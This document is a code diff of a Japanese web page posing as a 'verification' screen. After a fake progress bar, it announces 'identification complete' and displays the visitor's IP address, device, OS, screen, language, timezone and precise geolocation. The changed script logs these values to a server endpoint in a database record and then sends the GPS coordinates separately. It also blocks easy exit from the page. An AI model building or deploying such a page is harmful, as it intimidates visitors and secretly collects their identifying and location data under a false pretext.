@@ -1,71 +1,36 @@
 <!doctype html>
 <html lang="ja">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>検証中</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>検証中</title>
 
-  <style>
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      height: 100vh;
-      display: grid;
-      place-items: center;
-      background: #0b0b0b;
-      color: #e6e6e6;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      overflow: hidden;
-    }
-    .card {
-      width: min(92vw, 520px);
-      padding: 28px 26px 26px;
-      border-radius: 18px;
-      background: linear-gradient(180deg, #111, #0a0a0a);
-      box-shadow: 0 20px 60px rgba(0,0,0,.7),
-                  inset 0 0 0 1px rgba(255,255,255,.04);
-    }
-    h1 {
-      margin: 0 0 10px;
-      font-size: 1.2rem;
-      letter-spacing: .08em;
-      color: #9ef;
-    }
-    .muted { opacity: .65; font-size: .9rem; }
-    .bar {
-      height: 10px;
-      border-radius: 999px;
-      background: #111;
-      overflow: hidden;
-      margin: 16px 0;
-    }
-    .bar > i {
-      display: block;
-      height: 100%;
-      width: 0;
-      background: linear-gradient(90deg, #6cf, #f6f);
-      transition: width .25s;
-    }
-    .overlay {
-      position: fixed;
-      inset: 0;
-      display: grid;
-      place-items: center;
-      background: rgba(0,0,0,.88);
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity .4s;
-    }
-    .overlay.show {
-      opacity: 1;
-      pointer-events: auto;
-    }
-    .big {
-      font-size: clamp(1.8rem, 6vw, 3rem);
-      letter-spacing: .2em;
-    }
-    .muted.small { font-size: .9rem; opacity: .75; }
-  </style>
+<style>
+*{box-sizing:border-box}
+body{
+  margin:0;height:100vh;display:grid;place-items:center;
+  background:#0b0b0b;color:#e6e6e6;font-family:system-ui;overflow:hidden
+}
+.card{
+  width:min(92vw,520px);padding:28px 26px 26px;border-radius:18px;
+  background:linear-gradient(180deg,#111,#0a0a0a);
+  box-shadow:0 20px 60px rgba(0,0,0,.7),
+             inset 0 0 0 1px rgba(255,255,255,.04)
+}
+h1{margin:0 0 10px;font-size:1.2rem;letter-spacing:.08em;color:#9ef}
+.muted{opacity:.65;font-size:.9rem}
+.bar{height:10px;border-radius:999px;background:#111;overflow:hidden;margin:16px 0}
+.bar>i{display:block;height:100%;width:0;
+  background:linear-gradient(90deg,#6cf,#f6f);transition:width .25s}
+.overlay{
+  position:fixed;inset:0;display:grid;place-items:center;
+  background:rgba(0,0,0,.88);opacity:0;pointer-events:none;
+  transition:opacity .4s
+}
+.overlay.show{opacity:1;pointer-events:auto}
+.big{font-size:clamp(1.8rem,6vw,3rem);letter-spacing:.2em}
+.muted.small{font-size:.9rem;opacity:.75}
+</style>
 </head>
 
 <body>
@@ -80,19 +45,11 @@
   <div style="text-align:center;max-width:90vw">
     <div class="big">特 定 完 了</div>
 
-    <div id="profile" style="
-      text-align:left;
-      background:#000;
-      border-radius:14px;
-      padding:16px;
-      box-shadow: inset 0 0 0 1px rgba(255,255,255,.08);
-      margin-top:12px;
-    ">
+    <div style="text-align:left;background:#000;border-radius:14px;
+      padding:16px;box-shadow:inset 0 0 0 1px rgba(255,255,255,.08);margin-top:12px">
       <div class="muted small" style="margin-bottom:6px">取得情報（自動）</div>
-
       <ul id="infoList" style="list-style:none;padding:0;margin:0;line-height:1.7">
         <li>位置情報: <b id="geo">取得中…</b></li>
-        <li>照合ステータス: <b>完了</b></li>
         <li>ログID: <b id="logid">—</b></li>
         <li>端末: <b id="ua">—</b></li>
         <li>OS推定: <b id="os">—</b></li>
@@ -107,109 +64,94 @@
 </div>
 
 <script>
-const bar = document.getElementById('prog');
-const ov  = document.getElementById('ov');
+const bar=document.getElementById('prog');
+const ov=document.getElementById('ov');
+let logDbId=null;
 
-const TOTAL_MS = 11000;
-const HOLD_AT  = 85;
-const HOLD_MS  = 2000;
+const TOTAL_MS=11000,HOLD_AT=85,HOLD_MS=2000;
+let startAt=null,holdStartedAt=null,releasedAt=null,done=false;
 
-let startAt = null;
-let holdStartedAt = null;
-let releasedAt = null;
-let done = false;
-
-function frame(ts) {
-  if (startAt === null) startAt = ts;
-  const elapsed = ts - startAt;
-  let p;
-
-  if (elapsed <= TOTAL_MS * (HOLD_AT / 100)) {
-    p = Math.floor((elapsed / TOTAL_MS) * 100);
-  } else {
-    if (holdStartedAt === null) holdStartedAt = ts;
-    const holdElapsed = ts - holdStartedAt;
-    if (holdElapsed < HOLD_MS) {
-      p = HOLD_AT;
-    } else {
-      if (releasedAt === null) releasedAt = ts;
-      const post = ts - releasedAt;
-      p = Math.min(100, HOLD_AT + Math.floor((post / 500) * (100 - HOLD_AT)));
+function frame(ts){
+  if(startAt===null)startAt=ts;
+  const elapsed=ts-startAt;let p;
+  if(elapsed<=TOTAL_MS*(HOLD_AT/100)){
+    p=Math.floor((elapsed/TOTAL_MS)*100);
+  }else{
+    if(holdStartedAt===null)holdStartedAt=ts;
+    const h=ts-holdStartedAt;
+    if(h<HOLD_MS)p=HOLD_AT;
+    else{
+      if(releasedAt===null)releasedAt=ts;
+      p=Math.min(100,HOLD_AT+Math.floor(((ts-releasedAt)/500)*(100-HOLD_AT)));
     }
   }
-
-  bar.style.width = `${p}%`;
-
-  if (p < 100) requestAnimationFrame(frame);
-  else if (!done) { done = true; showResult(); }
+  bar.style.width=`${p}%`;
+  if(p<100)requestAnimationFrame(frame);
+  else if(!done){done=true;showResult();}
 }
 
-async function showResult() {
+async function showResult(){
   ov.classList.add('show');
-  await new Promise(r => setTimeout(r, 2000));
+  await new Promise(r=>setTimeout(r,1500));
 
-  ua.textContent   = navigator.userAgent;
-  os.textContent   = (/(Windows|Mac|Linux|Android|iPhone|iPad)/.exec(navigator.userAgent)||['Unknown'])[0];
-  scr.textContent  = `${screen.width}×${screen.height}`;
-  lang.textContent = navigator.language;
-  tz.textContent   = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  stay.textContent = `${Math.round(performance.now()/1000)} 秒`;
-  logid.textContent = Math.random().toString(36).slice(2,10).toUpperCase();
-  score.textContent = `${80 - Math.floor(Math.random()*20)} / 100`;
+  ua.textContent=navigator.userAgent;
+  os.textContent=(/(Windows|Mac|Linux|Android|iPhone|iPad)/.exec(navigator.userAgent)||['Unknown'])[0];
+  scr.textContent=`${screen.width}×${screen.height}`;
+  lang.textContent=navigator.language;
+  tz.textContent=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  stay.textContent=`${Math.round(performance.now()/1000)} 秒`;
+  score.textContent=80-Math.floor(Math.random()*20);
 
-  let ipAddr = '';
+  let ip='';
+  try{
+    const r=await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
+    const j=await r.json();ip=j.ip;
+    prependInfo(`IPアドレス: <b>${ip}</b>`);
+  }catch{}
 
-  try {
-    const r = await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
-    const j = await r.json();
-    ipAddr = j.ip;
-    prependInfo(`IPアドレス: <b>${j.ip}</b>`);
-  } catch {
-    prependInfo('IPアドレス: <b>取得失敗</b>');
-  }
-
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        geo.textContent = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
-      },
-      () => geo.textContent = '拒否 / 取得不可'
-    );
-  } else geo.textContent = '未対応';
-
-  /* ===== サーバへ送信 ===== */
-  fetch('http://localhost:3000/log', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({
-      ip: ipAddr,
-      ua: navigator.userAgent,
-      os: os.textContent,
-      screen: scr.textContent,
-      lang: navigator.language,
-      tz: tz.textContent,
-      score: parseInt(score.textContent),
-      geo: geo.textContent
+  /* ===== INSERT ===== */
+  const ins=await fetch('http://localhost:3000/log',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      ip,ua:ua.textContent,os:os.textContent,
+      screen:scr.textContent,lang:lang.textContent,
+      tz:tz.textContent,score:score.textContent,
+      geo:'取得中…'
     })
-  });
+  }).then(r=>r.json());
+
+  logDbId=ins.id;
+  logid.textContent=logDbId;
+
+  /* ===== GEO UPDATE ===== */
+  if('geolocation'in navigator){
+    navigator.geolocation.getCurrentPosition(
+      pos=>{
+        const g=`${pos.coords.latitude.toFixed(5)},${pos.coords.longitude.toFixed(5)}`;
+        geo.textContent=g;
+        fetch('http://localhost:3000/log/geo',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({id:logDbId,geo:g})
+        });
+      },
+      ()=>geo.textContent='拒否 / 取得不可'
+    );
+  }else geo.textContent='未対応';
 }
 
-function prependInfo(html) {
-  const ul = document.getElementById('infoList');
-  ul.querySelectorAll('li[data-ip]').forEach(n=>n.remove());
-  const li = document.createElement('li');
-  li.dataset.ip='1';
-  li.innerHTML=html;
-  ul.prepend(li);
+function prependInfo(html){
+  const ul=document.getElementById('infoList');
+  const li=document.createElement('li');
+  li.innerHTML=html;ul.prepend(li);
 }
 
-window.addEventListener('beforeunload', e => {
-  e.preventDefault();
-  e.returnValue='';
+window.addEventListener('beforeunload',e=>{
+  e.preventDefault();e.returnValue='';
 });
 
 requestAnimationFrame(frame);
 </script>
-
 </body>
 </html>
